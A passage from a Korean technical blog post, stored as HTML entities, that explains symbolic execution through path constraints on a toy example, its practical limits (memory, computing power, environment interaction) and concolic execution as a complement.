&#xCC38;&#xC774;&#xB124;&#xC694;! &#xB530;&#xB77C;&#xC11C; &#xC6B0;&#xB9AC;&#xB294; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xB294; &#xB450;&#xBC88;&#xC9F8; &#xC870;&#xAC74; $\pi = (\alpha_a \neq 0) \wedge (\alpha_b = 0)$&#xC744; &#xC54C;&#xC544;&#xB0C8;&#xB124;&#xC694;!(&#xD558;.. &#xD798;&#xB4E4;&#xB2E4;&#x2026;)</p><p>&#xB2E4;&#xC74C;&#xC73C;&#xB85C;&#xB294; state G &#xC785;&#xB2C8;&#xB2E4;. $stmt$&#xAC00; <code>x = 2*(a+b)</code> &#xC774;&#xB124;&#xC694;. &#xC774;&#xC5D0; &#xB9DE;&#xCDB0;&#xC11C; Symbolic Store $\sigma$&#xC5D0; &#xC788;&#xB294; $x$&#xB97C; $x \mapsto 2*(\alpha_a + \alpha_b)$&#xB85C; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xD574;&#xC90D;&#xB2C8;&#xB2E4;.</p><p>state H. $\sigma = { a \mapsto \alpha_a , b \mapsto \alpha_b, x \mapsto 2*(\alpha_a+\alpha_b), y \mapsto 4 }$,  $\pi = (\alpha_a \neq 0) \wedge (\alpha_b = 0)$, $stmt =$ <code>8. assert(x-y != 0)</code></p><p>&#xC774;&#xC81C; &#xB4DC;&#xB514;&#xC5B4; &#xB9C8;&#xC9C0;&#xB9C9; state &#xC785;&#xB2C8;&#xB2E4;! assert &#xD568;&#xC218;&#xB97C; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xC885;&#xB8CC;&#xB97C; &#xC2DC;&#xD0A4;&#xC9C0; &#xC54A;&#xACE0; &#xB118;&#xC5B4;&#xAC00;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; <code>x-y != 0</code>&#xAC00; &#xCC38;&#xC774; &#xB418;&#xC5B4;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xC5D0; &#xB9DE;&#xAC8C; Symbolic Store $\sigma$&#xC5D0; &#xC788;&#xB294; $x$&#xC640; $y$&#xB97C; &#xCC38;&#xACE0;&#xD558;&#xC5EC; &#xC0C8;&#xB85C;&#xC6B4; &#xACBD;&#xB85C; &#xC81C;&#xC57D; &#xC870;&#xAC74;&#xC744; &#xCD94;&#xAC00;&#xD574;&#xC8FC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. $x$&#xB294; $2*(\alpha_a + \alpha_b)$&#xC774;&#xACE0; $y$&#xB294; 4&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC774;&#xB97C; &#xBC18;&#xC601;&#xD558;&#xBA74; &#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xACBD;&#xB85C; &#xC81C;&#xC57D; &#xC870;&#xAC74; $\pi$&#xAC00; &#xB098;&#xC624;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;!</p><p>$\pi = (\alpha_a \neq 0) \wedge (\alpha_b = 0) \wedge 2*(\alpha_a + \alpha_b) + 4 \neq 0$</p><p>&#xC774; &#xB17C;&#xB9AC;&#xC2DD;&#xC744; &#xD480;&#xBA74; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xB294; a&#xC640; b &#xAC12;&#xC744; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xACA0;&#xB124;&#xC694;!(&#xB098;&#xBA38;&#xC9C0;&#xB294; SMT solver&#xAC00; &#xC54C;&#xC544;&#xC11C; &#xD574;&#xC904; &#xAC81;&#xB2C8;&#xB2E4; &#x314B;&#x314B;)</p><h2 id="Symbolic-Execution&#xC758;-&#xD55C;&#xACC4;"><a href="#Symbolic-Execution&#xC758;-&#xD55C;&#xACC4;" class="headerlink" title="Symbolic Execution&#xC758; &#xD55C;&#xACC4;"></a>Symbolic Execution&#xC758; &#xD55C;&#xACC4;</h2><p>&#xC5EC;&#xAE30;&#xAE4C;&#xC9C0;&#xB9CC; &#xBCF4;&#xC2DC;&#xBA74; &#x201C;&#xC6B0;&#xC640; Symbolic Execution&#xC740; &#xC6B0;&#xB9AC;&#xAC00; &#xBD84;&#xC11D;&#xD558;&#xAE30; &#xADC0;&#xCC2E;&#xC544;&#xD558;&#xB294; &#xAC83;&#xB3C4; &#xC54C;&#xC544;&#xC11C; &#xB2E4; &#xBD84;&#xC11D;&#xD574;&#xC11C; &#xC815;&#xB9D0; &#xC790;&#xB3D9;&#xC73C;&#xB85C; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xACA0;&#xB124;?&#x201D;&#xB77C;&#xACE0; &#xC0DD;&#xAC01;&#xD558;&#xC2E4; &#xC218; &#xC788;&#xACA0;&#xC9C0;&#xB9CC;&#x2026; &#xC774;&#xB860;&#xC801;&#xC73C;&#xB85C;&#xB294; &#xAC00;&#xB2A5;&#xD558;&#xB098; &#xD604;&#xC2E4;&#xC801;&#xC778; &#xC81C;&#xC57D;&#xB4E4;&#xC774; &#xB9CE;&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4; &#x3160;&#x3160; (&#xC774;&#xAC8C; &#xAC00;&#xB2A5;&#xD588;&#xC73C;&#xBA74; &#xC800;&#xB294; &#xBC8C;&#xC368; &#xAE38;&#xBC14;&#xB2E5;&#xC5D0; &#xC549;&#xC544; &#xAD6C;&#xAC78;&#xC744; &#xD558;&#xACE0; &#xC788;&#xC744;&#xC9C0;&#xB3C4;&#x2026;)</p><ol><li><p>&#xBA54;&#xBAA8;&#xB9AC;&#xC758; &#xC81C;&#xC57D;&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. </p><p>&#xC608;&#xC2DC;&#xB85C;&#xB4E0; foobar &#xD568;&#xC218;&#xB294; &#xB9E4;&#xC6B0; &#xC9E7;&#xC544;&#xC11C; &#xBD84;&#xC11D;&#xC774; &#xAC00;&#xB2A5;&#xD558;&#xC9C0;&#xB9CC; &#xC6B0;&#xB9AC;&#xAC00; &#xD604;&#xC2E4;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xB4E4;&#xC740; &#xD06C;&#xAE30;&#xAC00; &#xB9E4;&#xC6B0; &#xD07D;&#xB2C8;&#xB2E4;. &#xC77C;&#xBC18;&#xC801;&#xC778; &#xC624;&#xD53C;&#xC2A4;&#xB098; &#xD50C;&#xB808;&#xC774;&#xC5B4; &#xAC19;&#xC740; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xB4E4;&#xC740; &#xC791;&#xAC8C;&#xB294; &#xBA87; &#xBC31; MB &#xD639;&#xC740; &#xBA87; &#xC2ED; GB&#xAE4C;&#xC9C0; &#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB7F0; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xB4E4;&#xC744; &#xBD84;&#xC11D;&#xD558;&#xAE30; &#xC704;&#xD574; state&#xB97C; &#xACC4;&#xC18D;&#xD574;&#xC11C; &#xC313;&#xC544;&#xB098;&#xAC04;&#xB2E4;&#xACE0; &#xC0DD;&#xAC01;&#xD574;&#xBCF4;&#xC138;&#xC694;. &#xCD5C;&#xC18C; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xD06C;&#xAE30;&#xC758; &#xBA87; &#xBC30;&#xC5D0;&#xC11C; &#xBA87; &#xBC31;&#xBC30;&#xC758; &#xBA54;&#xBAA8;&#xB9AC;&#xAC00; &#xD544;&#xC694;&#xD560; &#xAC81;&#xB2C8;&#xB2E4;.(&#xB1CC;&#xD53C;&#xC15C;) &#xC774; &#xBB38;&#xC81C;&#xB294; Symbolic Execution&#xC774; &#xC81C;&#xC548;&#xB41C; 70&#xB144;&#xB300;&#xC5D0;&#xB3C4; &#xB611;&#xAC19;&#xC774; &#xC9C0;&#xC801;&#xB410;&#xC5C8;&#xB358; &#xBB38;&#xC81C;&#xC785;&#xB2C8;&#xB2E4;. &#xADF8; &#xB2F9;&#xC2DC;&#xC5D0;&#xB294; &#xC9C0;&#xAE08;&#xB9CC;&#xD07C; &#xBCF5;&#xC7A1;&#xD55C; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; &#xC5C6;&#xC5C8;&#xC744;&#xD150;&#xB370;&#xB3C4; &#xB9D0;&#xC774;&#xC8E0;. &#xBB3C;&#xB860; &#xC9C0;&#xAE08; &#xBA54;&#xBAA8;&#xB9AC; &#xAC12;&#xC774; &#xC2F8;&#xC9C0;&#xACE0; &#xD074;&#xB77C;&#xC6B0;&#xB4DC; &#xD50C;&#xB7AB;&#xD3FC;&#xC774; &#xC0DD;&#xAE30;&#xBA74;&#xC11C; &#xC880; &#xB354; &#xD070; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xD655;&#xBCF4;&#xD558;&#xB294;&#xAC8C; &#xC26C;&#xC6CC;&#xC84C;&#xC9C0;&#xB9CC; &#xC544;&#xC9C1;&#xAE4C;&#xC9C0;&#xB3C4; &#xC774;&#xB294; Symbolic Execution&#xC758; &#xB300;&#xD45C;&#xC801;&#xC778; &#xBB38;&#xC81C;&#xC810;&#xC73C;&#xB85C; &#xC9C0;&#xBAA9; &#xBC1B;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBB3C;&#xB860; &#xB9C8;&#xC774;&#xD06C;&#xB85C;&#xC18C;&#xD504;&#xD2B8;&#xB098; &#xAD6C;&#xAE00; &#xAC19;&#xC740; &#xB300;&#xAE30;&#xC5C5;&#xC5D0;&#xC11C;&#xB294; &#xBA87; &#xB9CC; &#xCF54;&#xC5B4;&#xC5D0; &#xBA87; &#xBC31; &#xD14C;&#xB77C;&#xBC14;&#xC774;&#xD2B8;&#xB85C; &#xB3CC;&#xB9AC;&#xACE0; &#xC788;&#xC744;&#xC9C0;&#xB3C4; &#xBAA8;&#xB974;&#xACA0;&#xC9C0;&#xB9CC;&#x2026; &#xC800; &#xAC19;&#xC740; &#xAC1C;&#xC778;&#xC774; &#xADF8;&#xB0E5; Symbolic Execution&#xC5D0;&#xB9CC; &#xC758;&#xC874;&#xD574;&#xC11C; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xB294; &#xC5D4;&#xC9C4;&#xC744; &#xB9CC;&#xB4E4;&#xC5C8;&#xB2E4;&#xACE0; &#xD574;&#xB3C4;&#x2026; &#xB3CC;&#xC544;&#xAC00;&#xB3C4; &#xD6A8;&#xC728;&#xC774; &#xC548; &#xC88B;&#xACA0;&#xC8E0;&#x2026; &#xC544;&#xB9C8; &#xADF8;&#xB0E5; Dumb Fuzzing&#xC774; &#xB354; &#xBE60;&#xB97C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4; &#x3160;&#x3160;</p></li><li><p>&#xCEF4;&#xD4E8;&#xD305; &#xD30C;&#xC6CC;&#xAC00; &#xBD80;&#xC871;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xBA54;&#xBAA8;&#xB9AC; &#xBB38;&#xC81C;&#xAC00; &#xD574;&#xACB0;&#xC774; &#xB410;&#xB2E4;&#xACE0; &#xCCD0;&#xB3C4; &#xBD84;&#xC11D;&#xD574;&#xC57C;&#xD560; &#xC2E4;&#xD589; &#xACBD;&#xB85C;&#xAC00; &#xB108;&#xBB34; &#xB9CE;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC0C1;&#xC6A9; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0;&#xC11C;&#xB294; &#xADF8;&#xB0E5; &#xBD84;&#xC11D;&#xD574;&#xC57C; &#xD560; &#xCF54;&#xB4DC;&#xB3C4; &#xC774;&#xBBF8; &#xB9CE;&#xC740;&#xB370;, &#xC774; &#xC548;&#xC5D0;&#xC11C; &#xC870;&#xAC74;&#xBD84;&#xAE30;&#xBB38;, &#xB8E8;&#xD504;&#xBB38;&#xB3C4; &#xB9CE;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xACE0; &#xC774;&#xC5D0; &#xB530;&#xB77C; &#xAC19;&#xC740; &#xCDE8;&#xC57D;&#xC810;&#xC774;&#xB354;&#xB77C;&#xB3C4; &#xB2E4;&#xB978; &#xC2E4;&#xD589; &#xACBD;&#xB85C;&#xB97C; &#xD1B5;&#xD574; &#xD2B8;&#xB9AC;&#xAC70;&#xB420; &#xC218;&#xB3C4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBAA8;&#xB4E0; &#xC2E4;&#xD589; &#xACBD;&#xB85C;&#xB97C; &#xBD84;&#xC11D;&#xD574;&#xC57C; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC81C;&#xC77C; exploit&#xD558;&#xAE30; &#xC88B;&#xC740; &#xC2E4;&#xD589; &#xACBD;&#xB85C;&#xB97C; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xB294; &#xAC83;&#xC774;&#xC8E0;. &#xC2EC;&#xC9C0;&#xC5B4; &#xD2B9;&#xC815; &#xC2E4;&#xD589; &#xACBD;&#xB85C;&#xC5D0;&#xC11C;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD2B8;&#xB9AC;&#xAC70;&#xD560; &#xC218; &#xC788;&#xC5B4;&#xB3C4; exploit&#xD558;&#xC9C0;&#xB294; &#xBABB;&#xD560; &#xC218;&#xB3C4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADFC;&#xB370; &#xC774;&#xB7F0; &#xC2E4;&#xD589; &#xACBD;&#xB85C;&#xB97C; fork&#xAE4C;&#xC9C0; &#xD574;&#xAC00;&#xBA74;&#xC11C; &#xBAA8;&#xB4E0; state&#xB97C; &#xB2E4; &#xC800;&#xC7A5;&#xD558;&#xACE0; &#xACC4;&#xC0B0;&#xD558;&#xACE0;&#x2026; &#xC77C;&#xB2E8; CPU&#xC758; &#xCF54;&#xC5B4; &#xAC1C;&#xC218;&#xB3C4; &#xB9CE;&#xC544;&#xC57C;&#xD560; &#xAC83;&#xC774;&#xACE0; &#xC2EC;&#xC9C0;&#xC5B4; &#xBE68;&#xB77C;&#xC57C;&#xD560; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC;&#x2026; &#xC6B0;&#xB9AC;&#xC5D0;&#xAC8C;&#xB294; &#xB9AC;&#xC0AC;&#xC218;&#xB290;&#xB2D8;&#xC774; &#xC788;&#xB2E4;!!! &#xD0B9;&#xAC13;&#xC2A4;&#xB808;&#xB4DC;&#xB9AC;&#xD37C;&#xB85C; &#xB3CC;&#xB9AC;&#xBA74; &#xB418;&#xC9C0; &#xC54A;&#xACA0;&#xB290;&#xB0D0;!!! &#xC608;&#x2026; &#xB204;&#xAC00; &#xD568; &#xAD6C;&#xD574;&#xC8FC;&#xC2E0;&#xB2E4;&#xBA74; &#xC5B4;&#xB5BB;&#xAC8C;&#xB4E0; &#xC628;&#xBAB8;&#xC744; &#xBC14;&#xCCD0; &#xB3CC;&#xB824;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4; &#x314E;&#xD5C8;&#xD5E3;&#x314E;(&#xC0DD;&#xAC01;&#xB9CC; &#xD574;&#xB3C4; &#xC88B;&#xB124;)</p><p><img src="/2021/07/21/j0ker/angr_part2/22HD9O4TZ2_4.jpeg" alt="./angr_part2/22HD9O4TZ2_4.jpeg"></p><blockquote><p>&#xC774;&#xCBE4;&#xC5D0;&#xC11C; &#xC601;&#xC811;&#xD574;&#xBCF4;&#xB294; &#xB9AC;&#xC0AC;&#xC218;&#xB290;&#xB2D8;</p></blockquote></li><li><p>&#xC2E4;&#xD589; &#xD658;&#xACBD;&#xACFC;&#xC758; interaction&#xC740; &#xBD84;&#xC11D;&#xD560; &#xC218; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xBA74; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xC6B4;&#xC601;&#xCCB4;&#xC81C; &#xC704;&#xC5D0; &#xC62C;&#xB77C;&#xAC00;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC6B4;&#xC601;&#xCCB4;&#xC81C;&#xC640; &#xC0C1;&#xD638;&#xC791;&#xC6A9;&#xC744; &#xD574;&#xC57C;&#xD569;&#xB2C8;&#xB2E4;. &#xD799;&#xC744; &#xD560;&#xB2F9;&#xD574;&#xC57C;&#xD560; &#xC218;&#xB3C4; &#xC788;&#xACE0; &#xC2DC;&#xC2A4;&#xD15C; &#xCF5C;&#xC744; &#xBCF4;&#xB0B4;&#xC57C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB807;&#xAC8C; &#xC694;&#xCCAD;&#xC744; &#xD55C; &#xAC83;&#xB4E4;&#xC740; &#xCEE4;&#xB110;&#xC5D0;&#xC11C; &#xC54C;&#xC544;&#xC11C; &#xD574;&#xC90D;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; Symbolic Execution &#xC5D4;&#xC9C4;&#xC5D0;&#xC11C;&#xB294; &#xCEE4;&#xB110;&#xC5D0;&#xC11C; &#xB3D9;&#xC791;&#xD558;&#xB294; &#xB0B4;&#xC6A9;&#xC744; &#xBD84;&#xC11D;&#xD558;&#xC9C0;&#xB294; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC544; &#xCEE4;&#xB110;&#xB3C4; &#xBD84;&#xC11D;&#xD574;&#xBC84;&#xB9AC;&#xBA74; &#xC548;&#xB418;&#xB0D0;&#xAD6C;&#xC694;? &#xD558;&#xD558; &#xADF8;&#xB807;&#xAC8C; &#xD558;&#xC9C0; &#xC54A;&#xC544;&#xB3C4; &#xC774;&#xBBF8; &#xBD84;&#xC11D;&#xD560; &#xAC70;&#xB9AC;&#xAC00; &#xB9CE;&#xC740;&#xB370;&#x2026; &#xADF8;&#xB807;&#xB2E4;&#xBA74; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xD1B5;&#xC2E0;&#xC740; &#xC5B4;&#xB5A8;&#xAE4C;&#xC694;? &#xC774;&#xAC83;&#xB3C4; &#xBD84;&#xC11D;&#xD560; &#xC218; &#xC788;&#xC744;&#xAE4C;&#xC694;? &#xB2F9;&#xC5F0;&#xD788; &#xC548;&#xB418;&#xACA0;&#xC8E0;. &#xC774;&#xB807;&#xAC8C; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xC678;&#xC801;&#xC778; &#xB300;&#xC0C1;&#xC5D0; &#xB300;&#xD55C; &#xBD84;&#xC11D;&#xC774; &#xBE60;&#xC838;&#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xBD84;&#xC11D;&#xC744; &#xC644;&#xBCBD;&#xD558;&#xAC8C; &#xC9C4;&#xD589;&#xD560; &#xC218; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;.</p></li></ol><h2 id="&#xD55C;&#xACC4;&#xC810;-&#xBCF4;&#xC644;"><a href="#&#xD55C;&#xACC4;&#xC810;-&#xBCF4;&#xC644;" class="headerlink" title="&#xD55C;&#xACC4;&#xC810; &#xBCF4;&#xC644;"></a>&#xD55C;&#xACC4;&#xC810; &#xBCF4;&#xC644;</h2><p>&#xADF8;&#xB807;&#xB2E4;&#xBA74; Symbolic Execution&#xC740; &#xB9AC;&#xC5BC;&#xC6D4;&#xB4DC;&#xC5D0;&#xC11C;&#xB294; &#xC4F8;&#xBAA8; &#xC5C6;&#xB294; &#xAC83; &#xC77C;&#xAE4C;&#xC694;? &#xADF8;&#xB807;&#xB2E4;&#xBA74; &#xC774;&#xB807;&#xAC8C; &#xC598;&#xAE30;&#xD558;&#xACE0; &#xC788;&#xC9C0; &#xC54A;&#xACA0;&#xC8E0; &#x314B;&#x314B; &#xB9E8; &#xC55E;&#xC5D0; &#xB3D9;&#xC801; &#xBD84;&#xC11D; &#xAE30;&#xBC95;&#xB4E4;&#xC774; &#xC11C;&#xB85C;&#xC758; &#xB2E8;&#xC810;&#xC744; &#xBCF4;&#xC644;&#xD558;&#xBA74;&#xC11C; &#xD65C;&#xC6A9;&#xB418;&#xACE0; &#xC788;&#xB294; &#xAC83;&#xCC98;&#xB7FC; Symbolic Execution &#xC5ED;&#xC2DC; &#xB2E8;&#xC810;&#xC744; &#xBCF4;&#xC644;&#xD574;&#xC904; &#xC218; &#xC788;&#xB294; &#xAE30;&#xBC95;&#xB4E4;&#xACFC; &#xAC19;&#xC774; &#xC0AC;&#xC6A9;&#xB418;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="Concolic-Execution"><a href="#Concolic-Execution" class="headerlink" title="Concolic Execution"></a>Concolic Execution</h3><p>&#xB300;&#xD45C;&#xC801;&#xC778;&#xAC8C; &#xBC14;&#xB85C; Concolic Execution&#xC785;&#xB2C8;&#xB2E4;. Concolic&#xC740; Concrete + Symbolic&#xC744; &#xD569;&#xCE5C; &#xD569;&#xC131;&#xC5B4;&#xB85C; Concrete Execution&#xACFC; Symbolic Execuition&#xC744; &#xB3D9;&#xC2DC;&#xC5D0; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xAC81;&#xB2C8;&#xB2E4;. Concrete Execution&#xC740; Symbolic Execution&#xACFC; &#xBC18;&#xB300;&#xB85C; &#xBBF8;&#xC9C0;&#xC218;&#xAC00; &#xC544;&#xB2CC; &#xAD6C;&#xCCB4;&#xC801;&#xC778; &#xAC12;&#xC744; &#xC778;&#xD48B;&#xC73C;&#xB85C; &#xC8FC;&#xACE0; &#xC2E4;&#xD589; &#xACFC;&#xC815;&#xC744; &#xBD84;&#xC11D;&#xD558;&#xB294; &#xAE30;&#xBC95;&#xC785;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xC774; &#xB450; &#xAE30;&#xBC95;&#xC744; &#xD569;&#xCCD0;&#xC11C; &#xC0AC;&#xC6A9;&#xD558;&#xAC8C; &#xB41C;&#xB2E4;&#xBA74; &#xAE30;&#xC874; Symbolic Store $\sigma$&#xC5D0; Concrete &#xAC12;&#xC774; &#xCD94;&#xAC00;&#xB429;&#xB2C8;&#xB2E4;. Concrete &#xAC12;&#xC744; &#xB123;&#xC5B4;&#xBCF4;&#xBA74;&#xC11C; &#xD2B9;&#xC815; &#xBD84;&#xAE30;&#xB85C; &#xBE60;&#xC9C0;&#xB294; &#xAC12;(Statisfiable&#xD55C; &#xAC12;)&#xC744; &#xBBF8;&#xB9AC; &#xC54C;&#xC544;&#xB0B4;&#xAC8C; &#xB41C;&#xB2E4;&#xBA74; SMT solver&#xC758; &#xACC4;&#xC0B0; &#xC5C6;&#xC774; &#xD574;&#xB2F9; &#xC2E4;&#xD589; &#xACBD;&#xB85C;&#xC5D0; &#xC880; &#xB354; &#xBE68;&#xB9AC; &#xC9C4;&#xC785;&#xD560; &#xC218; &#xC788;&#xB294; &#xC7A5;&#xC810;&#xC744; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xC678;&#xC5D0;&#xB3C4; &#xC120;&#xBCC4;&#xC801;&#xC778; &#xC2E4;&#xD589; &#xACBD;&#xB85C; &#xBD84;&#xC11D;&#xC774;&#xB77C;&#xB358;&#xAC00; fuzzing&#xACFC; &#xAC19;&#xC774; &#xD65C;&#xC6A9;&#xD55C;&#xB2E4;&#xB358;&#xAC00; &#xC5EC;&#xB7EC; &#xD65C;&#xC6A9; &#xAE30;&#xBC95;&#xB4E4;&#xC774; &#xC788;&#xC9C0;&#xB9CC; &#xC544;&#xC9C1;&#xC740; &#xB354; &#xACF5;&#xBD80;&#xD574;&#xC57C;&#xD560; &#xBD80;&#xBD84;&#xB4E4;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xB098;&#xC911;&#xC5D0; &#xB610; &#xB2E4;&#xB904;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p><h1 id="Symbolic-Execution-&#xACFC;&#xC815;&#xC5D0;&#xC11C;-&#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC740;-&#xC2E4;&#xD589;&#xB418;&#xC9C0;-&#xC54A;&#xB294;&#xB2E4;"><a href="#Symbolic-Execution-&#xACFC;&#xC815;&#xC5D0;&#xC11C;-&#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC740;-&#xC2E4;&#xD589;&#xB418;&#xC9C0;-&#xC54A;&#xB294;&#xB2E4;" class="headerlink" title="Symbolic Execution &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC740; &#xC2E4;&#xD589;&#xB418;&#xC9C0; &#xC54A;&#xB294;&#xB2E4;"></a>Symbolic Execution &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC740; &#xC2E4;&#xD589;&#xB418;&#xC9C0; &#xC54A;&#xB294;&#xB2E4;</h1><p>&#xCC98;&#xC74C;&#xC5D0; &#xC81C;&#xAC00; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xB294; &#xC758;&#xBB38;&#xC810;&#xC744; &#xC774;&#xC81C;&#xB294; &#xD480; &#xC218; &#xC788;&#xACA0;&#xB124;&#xC694;. Symbolic Execution &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xC2E4;&#xD589;&#xC774; &#xB418;&#xC9C0; &#xC54A;&#xACE0; &#xCF54;&#xB4DC;&#xB9CC; &#xBD84;&#xC11D;&#xC744; &#xD558;&#xB294; &#xAC83;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xB3D9;&#xC801; &#xBD84;&#xC11D;&#xC774;&#xB77C;&#xACE0; &#xBCFC; &#xC218; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; &#xC2E4;&#xD589;&#xB418;&#xBA74; &#xB85C;&#xB354;&#xC5D0;&#xC11C; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xB9E4;&#xD551;&#xD558;&#xACE0;, &#xD504;&#xB85C;&#xC138;&#xC2A4; ID&#xB97C; &#xD560;&#xB2F9;&#xD558;&#xC5EC; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xACE0;, CPU&#xC5D0; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC804;&#xB2EC;&#xD558;&#xC5EC; &#xAE30;&#xACC4;&#xC5B4;&#xB97C; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; Symbolic Execution &#xC5D4;&#xC9C4;&#xC5D0;&#xC11C;&#xB294; &#xC774;&#xB7F0; &#xC77C;&#xB828;&#xC758; &#xACFC;&#xC815;&#xC5C6;&#xC774; &#xC5D4;&#xC9C4;&#xC5D0; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xB85C;&#xB4DC;&#xD558;&#xACE0; &#xCF54;&#xB4DC;&#xB97C; &#xC5D4;&#xC9C4;&#xC774; &#xBD84;&#xC11D;&#xD558;&#xAE30; &#xC26C;&#xC6B4; IL(Intermediate language)&#xB85C; &#xBC14;&#xAFB8;&#xC5B4; &#xC704;&#xC5D0;&#xC11C; &#xC598;&#xAE30;&#xD55C; &#xC77C;&#xB828;&#xC758; &#xC791;&#xC5C5;&#xB4E4;&#xC744; &#xC9C4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. CPU&#xAC00; &#xC2E4;&#xC7AC;&#xB85C; &#xAE30;&#xACC4;&#xC5B4;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xAC83;&#xB3C4; &#xC544;&#xB2C8;&#xACE0; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xB9E4;&#xD551;&#xB418;&#xC9C0;&#xB3C4; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. IDA&#xAC00; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xB85C;&#xB4DC;&#xD558;&#xB294; &#xAC83;&#xACFC; &#xAC19;&#xB2E4;&#xACE0; &#xC0DD;&#xAC01;&#xD558;&#xBA74; &#xB418;&#xACA0;&#xB124;&#xC694;. </p><h1 id="Part-2-&#xB9C8;&#xBB34;&#xB9AC;"><a href="#Part-2-&#xB9C8;&#xBB34;&#xB9AC;" class="headerlink" title="Part 2 &#xB9C8;&#xBB34;&#xB9AC;"></a>Part 2 &#xB9C8;&#xBB34;&#xB9AC;</h1><p>&#xC0AC;&#xC2E4; Symbolic Execution&#xC744; &#xACF5;&#xBD80;&#xD574;&#xC57C;&#xACA0;&#xB2E4;&#xB77C;&#xACE0; &#xCC98;&#xC74C; &#xC0DD;&#xAC01;&#xD588;&#xC744; &#xB54C;, 